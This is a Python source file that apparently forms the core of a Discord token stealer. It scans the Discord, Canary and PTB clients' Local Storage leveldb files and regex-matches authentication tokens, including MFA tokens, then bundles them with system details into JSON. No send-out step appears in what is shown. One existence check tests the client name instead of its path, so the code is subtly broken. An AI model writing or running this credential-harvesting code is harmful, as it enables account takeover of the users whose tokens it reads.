import json
import os
import re

def findTokens(path):
    path += '/Local Storage/leveldb'
    tokens = []

    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
    except FileNotFoundError:
        pass

    return tokens

def locateTokens(getJson):
    home = os.getenv('HOME')
    configdir = home + "/.config"

    paths = {
        'discord': configdir + '/discord',
        'discord canary': configdir + '/discordcanary',
        'discord ptb': configdir + '/discordptb'
    }

    data = {
        'attempted': True,
        'system': {},
        'tokens': {}
    }

    data['system'] = {
        'name': os.name
    }

    for platform, path in paths.items():
        data['tokens'][platform] = {
            'found': True,
            'tokens': []
        }

        if not os.path.exists(platform):
            data['tokens'][platform]['found'] = False
            continue

        tokens = findTokens(path)

        if len(tokens) > 0:
            data['tokens'][platform]['tokens'] = tokens
        else:
            data['tokens'][platform]['found'] = False

    if getJson:
        return json.dumps(data)
    else:
        return data